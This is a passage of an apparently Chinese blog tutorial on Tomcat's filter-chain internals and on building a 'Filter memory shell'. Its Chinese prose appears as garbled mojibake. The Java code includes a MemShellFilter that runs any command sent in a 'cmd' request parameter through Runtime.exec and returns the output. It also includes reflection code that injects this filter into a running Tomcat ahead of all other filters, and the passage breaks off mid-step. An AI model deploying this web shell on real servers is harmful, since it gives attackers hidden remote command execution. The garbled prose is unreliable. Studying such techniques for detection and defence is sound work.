</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 5. å°†éœ€è¦åŠ è½½çš„FilteråŠ è½½åˆ°FilterChainå½“ä¸­ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Add filters that match on servlet name second
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 6. æ ¹æ®web.xmlé…ç½®æ–‡ä»¶ä¸­ï¼Œ&lt;filter-map&gt;æ ‡ç­¾ä¸­çš„å­æ ‡ç­¾&lt;servlet-name&gt;,åŠ è½½å“ªäº›ä¸“é—¨ä¸ºç‰¹å®šServletæœåŠ¡çš„filterï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersServlet</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">servletName</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 7. å°†éœ€è¦åŠ è½½çš„FilteråŠ è½½åˆ°FilterChainå½“ä¸­ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>FilterChainä¹‹åä¼šè°ƒç”¨å…¶doFilter()æ–¹æ³•ï¼Œä¾æ¬¡è°ƒç”¨å†…ç½®çš„Filterçš„doFilter()æ–¹æ³•æ¥è¿‡æ»¤è¯·æ±‚ï¼Œæœ€ç»ˆä¼ é€’ç»™Servletçš„service()æ–¹æ³•è¿›è¡Œè¯·æ±‚çš„å¤„ç†ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>FilterChain#doFilterè°ƒç”¨FilterChain#internalDoFilter; <!-- raw HTML omitted --></li>
<li>æ ¹æ®filterConfigæ¥è·å–filterå¯¹è±¡; <!-- raw HTML omitted --></li>
<li>è°ƒç”¨filteræœ¬èº«çš„doFilteræ–¹æ³•ï¼Œè¿‡æ»¤æ“ä½œç»“æŸä¹‹åå†ä¼ é€’ç»™ä¸‹ä¸€ä¸ªfilter; <!-- raw HTML omitted --></li>
<li>æ‰€æœ‰çš„filteréƒ½doFilteræ“ä½œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„servletçš„service()æ–¹æ³•æ­£å¼æ¥ç®¡å¤„ç†request; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// è°ƒç”¨internalDoFilter()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">ServletRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">ServletResponse</span> <span class="n">res</span> <span class="o">=</span> <span class="n">response</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedExceptionAction</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">public</span> <span class="n">Void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">ApplicationFilterChain</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">internalDoFilter</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="n">res</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">});</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">internalDoFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">internalDoFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">n</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">filters</span><span class="o">[</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span><span class="o">++];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 1. æ ¹æ®filterConfigæ¥è·å–filterå¯¹è±¡;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="n">filterConfig</span><span class="o">.</span><span class="na">getFilter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 2. è°ƒç”¨filteræœ¬èº«çš„doFilteræ–¹æ³•ï¼Œè¿‡æ»¤æ“ä½œç»“æŸä¹‹åå†ä¼ é€’ç»™ä¸‹ä¸€ä¸ªfilter;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">filter</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">....</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">HttpServletRequest</span> <span class="o">&amp;&amp;</span> <span class="n">response</span> <span class="k">instanceof</span> <span class="n">HttpServletResponse</span> <span class="o">&amp;&amp;</span> <span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 3. æ‰€æœ‰çš„filteréƒ½doFilteræ“ä½œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„servletçš„service()æ–¹æ³•æ­£å¼æ¥ç®¡å¤„ç†request;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">this</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">service</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h3 id="filterå†…å­˜é©¬çš„æ„é€ ">Filterå†…å­˜é©¬çš„æ„é€ </h3>
<p>æˆ‘ä»¬åœ¨ä¸Šä¸€å°èŠ‚ä¸­ä»‹ç»äº†é’ˆå¯¹æ¯ä¸€æ¬¡å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚ï¼ŒTomcatæ˜¯å¦‚ä½•æ„é€ FiltetrChainçš„ï¼ŒåŒæ—¶ä¹Ÿçœ‹åˆ°äº†Tomcatæ˜¯å¦‚ä½•æŒ‘é€‰éœ€è¦åŠ å…¥Filter Chainçš„Filterçš„ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªé‡è¦çš„æˆå‘˜å˜é‡ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>filterMaps: å­˜å‚¨FilterMapçš„ä¿¡æ¯ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯å¦ä¸ºæœ¬æ¬¡FilterChainæ„é€ æ‰€éœ€çš„Filterï¼› <!-- raw HTML omitted --></li>
<li>filterConfig: ç”¨æ¥å°è£…Filterå®ä¾‹ï¼Œä»è€Œæ·»åŠ åˆ°FilterChainä¸­ï¼› <!-- raw HTML omitted --></li>
</ol>
<p>æˆ‘ä»¬ä¹‹å‰æœ‰æåˆ°ï¼ŒFilterå†…å­˜é©¬å°±æ˜¯è¦æ„å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ï¼Œå¸¦æœ‰æ¶æ„ä»£ç çš„Filterç±»ï¼Œå¹¶å°†è¿™ä¸ªæ¶æ„çš„Filterç±»åœ¨Tomcatçš„è¿è¡Œè¿‡ç¨‹ä¸­è¢«æ³¨å†Œï¼Œä»è€Œå½“Tomcatä¸‹ä¸€æ¬¡æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„HTTPè¯·æ±‚æ—¶ï¼Œåœ¨æ„é€ FilterChainçš„æ—¶å€™ï¼Œå°±ä¼šå°†æˆ‘ä»¬æ„é€ çš„æ¶æ„Filterç±»åŠ å…¥ï¼Œä»è€Œåœ¨doFilteræ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼› <!-- raw HTML omitted --></p>
<p>é‚£æˆ‘ä»¬çš„æƒ³æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>æ‹¿åˆ°ä¸€ä¸ªStandardContextçš„å®ä¾‹ï¼› <!-- raw HTML omitted --></li>
<li>å‘StandardContextçš„å®ä¾‹ä¸­çš„filterMapsä»¥åŠfilterConfigsä¸¤ä¸ªHashMapæ·»åŠ æˆ‘ä»¬æ‰€éœ€è¦çš„Filterå®ä¾‹ä»¥åŠç›¸å…³ä¿¡æ¯ï¼› <!-- raw HTML omitted -->
<ul>
<li>ä½¿å¾—filterå¯ä»¥è¢«æŒ‘é€‰åŠ å…¥åˆ°FilterChainçš„æ„é€ ä¸­ï¼› <!-- raw HTML omitted --></li>
<li>æœ€åfilterå®ä¾‹å°±å¯ä»¥åœ¨doFilterä¸­æ‰§è¡Œæ¶æ„ä»£ç äº†ï¼› <!-- raw HTML omitted --></li>
</ul>
</li>
</ol>
<p>æ ¹æ®è¿™ä¸ªæ€è·¯æˆ‘ä»¬æ¥æ„é€ ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„Filterå†…å­˜é©¬ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>
<p>è‡ªå®šä¹‰ä¸€ä¸ªFilterç±»ï¼Œå®ç°Filteræ¥å£ï¼Œé‡å†™ <code>doFilter()</code> æ–¹æ³•ï¼Œå®ç°æ¶æ„ä»£ç ï¼› <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellFilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>é€šè¿‡ServletRequestå®ä¾‹request(jspä¸­å¯ä»¥ç›´æ¥è·å–)ï¼Œåˆ©ç”¨åå°„å¾—åˆ° <code>ApplicationContextFacade</code> é—¨é¢ç±»çš„å®ä¾‹ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>è¿™é‡Œä¸€å®šè¦ä½¿ç”¨åå°„æ˜¯å› ä¸ºæˆå‘˜å˜é‡ <code>context</code> æ˜¯ç§æœ‰å˜é‡ï¼› <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//  æ ¹æ®requestè·å–ApplicationContextFacadeå®ä¾‹ç±»;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ApplicationContextFacade</span> <span class="n">applicationContextFacade</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContextFacade</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è·å–ApplicationContextå®ä¾‹ç±»;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">appContextField</span> <span class="o">=</span> <span class="n">applicationContextFacade</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">appContextField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appContextField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContextFacade</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>æ¥ç€é€šè¿‡ApplicationContextFacadeçš„å®ä¾‹ç±»åå°„å¾—åˆ° <code>StandardContext</code> çš„å®ä¾‹ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>ä½¿ç”¨çš„åå°„çš„åŸå› åŒä¸Šï¼› <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// è·å–standardContextå®ä¾‹;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">standardContextField</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">standardContextField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">standardContextField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>æ–°å»ºä¸€ä¸ªè‡ªå®šä¹‰Filterçš„å®ä¾‹ï¼Œå¹¶ç”±æ­¤æ„é€ FilterDefå®ä¾‹ï¼Œå¹¶æ·»åŠ åˆ°standardContextçš„ <code>filterDefs</code> ä¸­ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>filterDefæœ¬èº«æ˜¯Tomaté€šè¿‡è¯»å–web.xmlä¸­çš„&lt;filter&gt;æ ‡ç­¾çš„ä¿¡æ¯æ¥è·å–çš„ï¼Œè¿™é‡Œè‡ªå·±æ„å»ºå°±éœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸€äº›æˆå‘˜å˜é‡ï¼› <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">MemShellFilter</span> <span class="n">memShellFilter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellFilter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">// å°†Filterå°è£…åˆ°FilterDefä¸­;
</span></span></span><span class="line"><span class="cl"><span class="c1">// è¿›è€Œå°†FilterDefæ·»åŠ åˆ°standardContextçš„filterDefsä¸­ï¼Œå¦‚æ­¤æ‰å¯ä»¥åœ¨æ·»åŠ filterMapsæ—¶é€šè¿‡éªŒè¯ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">String</span> <span class="n">filterName</span> <span class="o">=</span> <span class="s">&#34;MemShellFilter&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterDef</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">filterDef</span><span class="o">.</span><span class="na">setFilter</span><span class="o">(</span><span class="n">memShellFilter</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">filterName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterClass</span><span class="o">(</span><span class="n">memShellFilter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filterDef</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>æ ¹æ®Filterçš„å®ä¾‹ï¼Œæ„é€ FilterMapï¼Œå¹¶æ·»åŠ åˆ°standardContextçš„ <code>filterMaps</code> çš„ç¬¬ä¸€ä½ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>filterMapæœ¬èº«æ˜¯Tomaté€šè¿‡è¯»å–web.xmlä¸­çš„&lt;filter-mapping&gt;æ ‡ç­¾çš„ä¿¡æ¯æ¥è·å–çš„ï¼› <!-- raw HTML omitted --></li>
<li>Tomcatåœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šæ„é€ æ–°çš„FilterChainè´£ä»»é“¾ï¼Œè€Œé€‰æ‹©FilteråŠ å…¥è´£ä»»é“¾çš„æ ‡å‡†å°±æ˜¯æ ¹æ®FilterMapä¸­çš„é…ç½®ä¿¡æ¯æ¥çš„ï¼› <!-- raw HTML omitted --></li>
<li>URLçš„ä¿¡æ¯å°±è¡¨ç¤ºå¯¹äºæ‰€æœ‰åœ¨&quot;/&ldquo;ç›®å½•ä¸‹çš„èµ„æºéƒ½éœ€è¦è¿™ä¸ªFilterçš„è¿‡æ»¤ï¼› <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// æ ¹æ®Filteræ„å»ºä¸€ä¸ªæ–°çš„filterMapå®ä¾‹ï¼Œæœ€ååŠ å…¥standardContextæ‰€ä¿å­˜çš„filtermapsçš„æœ€å‰ç«¯ï¼Œå¯ä»¥æœ€æ—©è¢«è°ƒç”¨æ‰§è¡Œ;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">filterMap</span><span class="o">.</span><span class="na">addURLPattern</span><span class="o">(</span><span class="s">&#34;/*&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterMap</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">filterName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterMap</span><span class="o">.</span><span class="na">setDispatcher</span><span class="o">(</span><span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">DispatcherType</span><span class="o">.</span><span class="na">REQUEST</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterMapBefore</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>é€šè¿‡StandardContextåå°„å¾—åˆ° <code>filterConfigs</code>, å¹¶æ ¹æ®filterDefæ„é€ ä¸€ä¸ªFilterConfigå®ä¾‹åŠ å…¥filterConfigsä¸­ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>filterConfigsæœ¬èº«æ˜¯åœ¨Tomcatå¯åŠ¨çš„æ—¶å€™ï¼Œè°ƒç”¨ <code>filterStart()</code> å°† <strong>filterDef</strong> è½¬åŒ–æˆ <strong>filterConfig</strong> è€Œå½¢æˆçš„ï¼› <!-- raw HTML omitted --></li>
<li>è¿™é‡Œä½¿ç”¨åå°„çš„åŸå› ä¹Ÿæ˜¯åŒä¸Šï¼› <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// è·å–standardContextæ‰€ä¿å­˜çš„Map: filterConfigs;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">filterConfigsField</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterConfigsField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">HashMap</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">filterConfigsField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// åˆ©ç”¨åå°„ï¼Œé€šè¿‡ä¹‹å‰å®šä¹‰çš„filterDefæ„é€ ä¸€ä¸ªæ–°çš„filterConfigå¹¶åŠ å…¥filterConfigsä¸­
